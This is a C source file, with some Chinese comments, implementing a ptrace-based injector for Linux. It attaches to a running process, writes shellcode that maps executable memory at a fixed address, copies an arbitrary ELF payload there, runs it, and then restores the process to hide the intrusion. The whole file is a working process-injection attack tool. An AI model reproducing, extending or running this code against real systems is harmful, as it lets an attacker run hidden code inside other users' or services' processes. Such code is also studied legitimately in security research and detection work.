#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

#define WORD_ALIGN(x) ((x + 7) & ~7)
#define PAYLOAD_ADDR 0x00100000

static inline volatile void *
evil_mmap(void *, uint64_t, uint64_t, uint64_t, int64_t, uint64_t) __attribute__((aligned(8),__always_inline__));

uint64_t injection_code(void *) __attribute__((aligned(8)));

static inline volatile void *
evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, int64_t fd, uint64_t off)
{
	long mmap_fd = fd;
	unsigned long mmap_off = off;
	unsigned long mmap_flags = flags;
	unsigned long ret;

	asm volatile(
	"mov %0, %%rdi\n"
	"mov %1, %%rsi\n"
	"mov %2, %%rdx\n"
	"mov %3, %%r10\n"	// 好生奇怪，为什么不能用rcx
	"mov %4, %%r8\n"
	"mov %5, %%r9\n"
	"mov $9, %%rax\n"
	"syscall"
	:
	:"g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));

	asm("mov %%rax, %0":"=r"(ret));

	return (void *)ret;
}

uint64_t injection_code(void *vaddr)
{
	volatile void *mem;
	mem = evil_mmap(vaddr, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 0, 0);

	__asm__ __volatile__("int $0x03");
}

void injection_code_end()
{
}

int pid_read(int pid, void *dst, const void *src, size_t len)
{
	const wordsize = sizeof(Elf64_Xword);
	size_t count = len / wordsize;
	Elf64_Xword *s = (Elf64_Xword *)src;
	Elf64_Xword *d = (Elf64_Xword *)dst;
	int i;
	Elf64_Xword word;

	for (i = 0; i < count; i++, s++, d++) {
		word = ptrace(PTRACE_PEEKTEXT, pid, (void *)s, NULL);
		if (word == -1)
			goto over;

		*d = word;
	}

	if (count % wordsize != 0) {
		word = ptrace(PTRACE_PEEKTEXT, pid, (void *)s, NULL);
		if (word == -1)
			goto over;

		*d = word;
	}

	return 0;

over:
	perror("PTRACE_PEEKTEXT");
	return -1;
}

int pid_write(int pid, void *dst, const void *src, size_t len)
{
	const wordsize = sizeof(Elf64_Xword);
	size_t count = len / wordsize;
	Elf64_Xword *s = (Elf64_Xword *)src;
	Elf64_Xword *d = (Elf64_Xword *)dst;
	int i;

	for (i = 0; i < count; i++, s++, d++) {
		if (ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == -1) {
			goto over;
		}
	}

	if (len % wordsize != 0) {
		if (ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == -1) {
			goto over;
		}
	}

	return 0;

over:
	perror("PTRACE_POKETEXT");
	return -1;
}

Elf64_Addr pid_load(int pid, void *dst, char *path)
{
	int fd;
	struct stat st;
	void * mem = NULL;
	Elf64_Ehdr *ehdr;
	Elf64_Addr entry = 0;


	if ((fd = open(path, O_RDONLY)) < 0) {
		perror("open");
		exit(-1);
	}

	if (fstat(fd, &st) < 0) {
		perror("fstat");
		exit(-1);
	}

	mem = malloc(WORD_ALIGN(st.st_size));
	if (read(fd, mem, st.st_size) < 0)
		goto over;

	close(fd);

	if (pid_write(pid, dst, mem, st.st_size) < 0)
		goto over;

	ehdr = (Elf64_Ehdr *)mem;
	entry = ehdr->e_entry;

over:
	if (mem)
		free(mem);

	return entry;
}


int main(int argc, char *argv[])
{
	int pid;
	int status;

	struct user_regs_struct ori_regs;
	struct user_regs_struct cur_regs;

	char 		*payload_path;
	Elf64_Addr	payload_entry;

	void		*shellcode_addr;
	unsigned long	shellcode_size;

	void		*original_code;

	if (argc < 3) {
		printf("Usage: %s <pid> <executable\n>", argv[0]);
		exit(-1);
	}
	pid = atoi(argv[1]);
	payload_path = strdup(argv[2]);



	shellcode_addr = (void *)injection_code;
	shellcode_size = (void *)injection_code_end - (void *)injection_code;

	// attach进程
	if (ptrace(PTRACE_ATTACH, pid) < 0) {
		perror("PTRACE_ATTACH");
		exit(-1);
	}
	wait(NULL);

	// 备份原始寄存器、代码
	if (ptrace(PTRACE_GETREGS, pid, NULL, &cur_regs) < 0) {
		exit(-1);
	}

	ori_regs = cur_regs;

	original_code = alloca(shellcode_size + 8);
	if (pid_read(pid, original_code, (void *)ori_regs.rip, shellcode_size) < 0)
		exit(-1);

	// 写入shellcode
	if (pid_write(pid, (void *)cur_regs.rip, shellcode_addr, shellcode_size) < 0) {
		exit(-1);
	}

	// 传参并执行shellcode
	cur_regs.rdi = PAYLOAD_ADDR;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &cur_regs) < 0) {
		perror("PTRACE_SETREGS");
		exit(-1);
	}

	if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
		perror("PTRACE_CONT");
		exit(-1);
	}
	wait(&status);

	if (WSTOPSIG(status) != SIGTRAP) {
		printf("signal: %s\n", strsignal(WSTOPSIG(status)));
		exit(-1);
	}

	// 把payload载入到指定区域
	payload_entry = pid_load(pid, (void *)PAYLOAD_ADDR, payload_path);

	//  执行payload
	if (ptrace(PTRACE_GETREGS, pid, NULL, &cur_regs) < 0) {
		perror("PTRACE_GETREGS");
		exit(-1);
	}

	cur_regs.rip = PAYLOAD_ADDR + payload_entry;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &cur_regs) < 0) {
		perror("PTRACE_SETREGS");
		exit(-1);
	}

	if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
		perror("PTRACE_CONT");
		exit(-1);
	}
	wait(&status);

	// 恢复原程序
	if (pid_write(pid, (void *)ori_regs.rip, original_code, shellcode_size) < 0) {
		exit(-1);
	}

	if (ptrace(PTRACE_SETREGS, pid, NULL, &ori_regs) < 0) {
		perror("PTRACE_SETREGS");
		exit(-1);
	}

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
		perror("PTRACE_DETACH");
		exit(-1);
	}
	wait(NULL);

	exit(0);
}
